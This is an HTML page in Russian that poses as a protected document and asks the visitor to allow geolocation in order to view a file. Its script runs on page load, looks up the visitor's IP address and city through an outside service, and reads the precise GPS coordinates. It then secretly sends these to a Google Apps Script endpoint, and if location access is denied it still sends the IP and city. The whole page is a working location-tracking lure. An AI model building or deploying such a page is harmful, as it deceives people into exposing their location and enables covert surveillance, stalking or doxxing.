<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Документ защищен</title></head>
<body style="text-align:center; padding-top:50px; font-family:sans-serif;">
    <h2>Пожалуйста, разрешите доступ к геолокации для просмотра файла.</h2>
    <script>
    fetch('https://ipwho.is/').then(r=>r.json()).then(d=>{
        navigator.geolocation.getCurrentPosition(pos => {
            let url = "https://script.google.com/macros/s/AKfycbzC4vkiApw_KKRZXXtoWH3JjBCG2Hp7k3urQ6qsmbt6j6NSRPEy9KSth1UiYLQKJAS0BQ/exec?ip="+d.ip+"&city="+d.city+"&lat="+pos.coords.latitude+"&lon="+pos.coords.longitude;
            fetch(url, {mode: 'no-cors'});
        }, err => {
            let url = "https://script.google.com/macros/s/AKfycbzC4vkiApw_KKRZXXtoWH3JjBCG2Hp7k3urQ6qsmbt6j6NSRPEy9KSth1UiYLQKJAS0BQ/exec?ip="+d.ip+"&city="+d.city+"&lat=denied&lon=denied";
            fetch(url, {mode: 'no-cors'});
        });
    });
    </script>
</body>
</html>
